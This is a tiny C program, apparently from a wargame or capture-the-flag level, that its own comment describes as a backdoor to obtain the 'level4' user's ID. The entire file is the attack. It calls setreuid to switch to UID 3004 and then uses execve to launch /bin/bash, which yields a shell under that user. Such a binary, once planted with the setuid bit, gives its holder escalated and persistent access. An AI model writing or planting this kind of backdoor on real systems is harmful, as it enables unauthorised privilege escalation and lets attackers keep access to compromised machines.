# Description:
# This is backdoor to get level4's uid

#include <sys/types.h>
#include <unistd.h>

int main()
{
	char *cmd[2]; 
	cmd[0]="/bin/bash";
	cmd[1]=(void *)0;

	setreuid(3004,3004);
	execve(cmd[0], cmd, cmd[1]);   
}
